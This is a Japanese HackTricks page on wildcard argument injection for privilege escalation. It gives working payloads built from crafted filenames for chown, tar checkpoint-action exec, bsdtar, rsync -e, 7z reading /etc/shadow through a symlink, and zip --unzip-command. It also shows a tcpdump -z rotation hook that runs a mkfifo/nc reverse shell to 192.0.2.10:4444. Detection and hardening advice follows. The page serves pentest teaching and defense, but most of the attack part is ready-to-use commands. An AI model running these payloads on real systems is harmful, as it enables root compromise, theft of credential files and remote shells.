# ワイルドカードのスペアトリック

{{#include ../../banners/hacktricks-training.md}}

> ワイルドカード（別名 *glob*）**引数注入**は、特権スクリプトが `tar`、`chown`、`rsync`、`zip`、`7z` などのUnixバイナリを、引用符なしのワイルドカード `*` と共に実行する際に発生します。
> シェルはバイナリを実行する**前に**ワイルドカードを展開するため、作業ディレクトリにファイルを作成できる攻撃者は、`-` で始まるファイル名を作成することで、**データではなくオプション**として解釈されるようにし、任意のフラグやコマンドを効果的に密輸することができます。
> このページでは、2023-2025年の最も有用なプリミティブ、最近の研究、現代の検出方法を集めています。

## chown / chmod

`--reference` フラグを悪用することで、**任意のファイルの所有者/グループまたは権限ビットをコピー**できます：
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
ルートが後で次のようなものを実行するとき:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` が注入され、*すべての* 一致するファイルが `/root/secret``file` の所有権/権限を継承します。

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (複合攻撃)。
詳細については、古典的な DefenseCode の論文も参照してください。

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**チェックポイント** 機能を悪用して任意のコマンドを実行します:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
一度rootが例えば`tar -czf /root/backup.tgz *`を実行すると、`shell.sh`がrootとして実行されます。

### bsdtar / macOS 14+

最近のmacOSのデフォルトの`tar`（`libarchive`に基づく）は`--checkpoint`を実装していませんが、外部コンプレッサーを指定できる**--use-compress-program**フラグを使用することで、コード実行を達成することができます。
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
特権スクリプトが `tar -cf backup.tar *` を実行すると、`/bin/sh` が起動します。

---

## rsync

`rsync` は、`-e` または `--rsync-path` で始まるコマンドラインフラグを介してリモートシェルやリモートバイナリをオーバーライドすることを可能にします：
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
もしrootが後でディレクトリを`rsync -az * backup:/srv/`でアーカイブすると、注入されたフラグがリモート側でシェルを起動します。

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync`モード)。

---

## 7-Zip / 7z / 7za

特権スクリプトが*防御的に*ワイルドカードの前に`--`を付けて（オプション解析を止めるために）も、7-Zipフォーマットは**ファイルリストファイル**をサポートしており、ファイル名の前に`@`を付けることができます。それをシンボリックリンクと組み合わせることで、*任意のファイルを外部に抽出*できます：
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
もしrootが次のようなコマンドを実行すると:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zipは`root.txt`（→ `/etc/shadow`）をファイルリストとして読み取ろうとし、失敗し、**内容をstderrに出力します**。

---

## zip

`zip`は、アーカイブがテストされるときにシステムシェルに*そのまま*渡されるフラグ`--unzip-command`をサポートしています：
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
フラグを作成されたファイル名を介して注入し、特権バックアップスクリプトが結果のファイルに対して `zip -T`（アーカイブテスト）を呼び出すのを待ちます。

---

## ワイルドカードインジェクションに脆弱な追加バイナリ（2023-2025年のクイックリスト）

以下のコマンドは、現代のCTFや実際の環境で悪用されています。ペイロードは常に、後でワイルドカードで処理される書き込み可能なディレクトリ内の*ファイル名*として作成されます：

| バイナリ | 悪用するフラグ | 効果 |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → 任意の `@file` | ファイル内容の読み取り |
| `flock` | `-c <cmd>` | コマンドの実行 |
| `git`   | `-c core.sshCommand=<cmd>` | SSH経由でのgitによるコマンド実行 |
| `scp`   | `-S <cmd>` | sshの代わりに任意のプログラムを起動 |

これらのプリミティブは*tar/rsync/zip*のクラシックよりも一般的ではありませんが、ハンティングの際には確認する価値があります。

---

## tcpdump回転フック（-G/-W/-z）：ラッパー内のargvインジェクションによるRCE

制限されたシェルまたはベンダーラッパーが、厳密な引用/検証なしにユーザー制御フィールド（例：「ファイル名」パラメータ）を連結して`tcpdump`コマンドラインを構築する場合、追加の`tcpdump`フラグを密輸できます。`-G`（時間ベースの回転）、`-W`（ファイル数の制限）、および`-z <cmd>`（ポストローテートコマンド）の組み合わせは、tcpdumpを実行しているユーザー（通常は機器上のroot）として任意のコマンド実行をもたらします。

前提条件：

- `tcpdump`に渡される`argv`に影響を与えることができる（例：`/debug/tcpdump --filter=... --file-name=<HERE>`のようなラッパーを介して）。
- ラッパーはファイル名フィールド内のスペースや`-`で始まるトークンをサニタイズしません。

クラシックPoC（書き込み可能なパスからリバースシェルスクリプトを実行）：
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
詳細:

- `-G 1 -W 1` は、最初の一致するパケットの後に即座にローテートを強制します。
- `-z <cmd>` は、ローテーションごとにポストローテートコマンドを1回実行します。多くのビルドは `<cmd> <savefile>` を実行します。 `<cmd>` がスクリプト/インタープリタの場合、引数の処理がペイロードに一致することを確認してください。

ノンリムーバブルメディアのバリアント:

- ファイルを書き込むための他のプリミティブ（例: 出力リダイレクションを許可する別のコマンドラッパー）がある場合、スクリプトを既知のパスにドロップし、プラットフォームのセマンティクスに応じて `-z /bin/sh /path/script.sh` または `-z /path/script.sh` をトリガーします。
- 一部のベンダーラッパーは攻撃者が制御可能な場所にローテートします。ローテートされたパスに影響を与えることができれば（シンボリックリンク/ディレクトリトラバーサル）、`-z` を操作して外部メディアなしで完全に制御するコンテンツを実行できます。

ベンダー向けのハードニングのヒント:

- 厳格なホワイトリストなしでユーザー制御の文字列を直接 `tcpdump`（または任意のツール）に渡さないでください。引用して検証してください。
- ラッパーで `-z` 機能を公開しないでください; tcpdump を固定の安全なテンプレートで実行し、追加のフラグを完全に禁止します。
- tcpdump の特権を削除する（cap_net_admin/cap_net_raw のみ）か、AppArmor/SELinux の制約の下で専用の特権のないユーザーとして実行します。

## 検出とハードニング

1. **重要なスクリプトでシェルグロビングを無効にする**: `set -f` (`set -o noglob`) はワイルドカードの展開を防ぎます。
2. **引数を引用またはエスケープする**: `tar -czf "$dst" -- *` は安全ではありません — `find . -type f -print0 | xargs -0 tar -czf "$dst"` を好みます。
3. **明示的なパス**: `*` の代わりに `/var/www/html/*.log` を使用して、攻撃者が `-` で始まる兄弟ファイルを作成できないようにします。
4. **最小特権**: 可能な限り、バックアップ/メンテナンスジョブをルートではなく特権のないサービスアカウントとして実行します。
5. **監視**: Elastic の事前構築されたルール *Potential Shell via Wildcard Injection* は、`tar --checkpoint=*`、`rsync -e*`、または `zip --unzip-command` の後にすぐにシェル子プロセスが続くことを探します。EQL クエリは他の EDR に適応できます。

---

## 参考文献

* Elastic Security – Potential Shell via Wildcard Injection Detected ルール (最終更新 2025)
* Rutger Flohil – “macOS — Tar wildcard injection” (2024年12月18日)
* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
* FiberGateway GR241AG – [Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
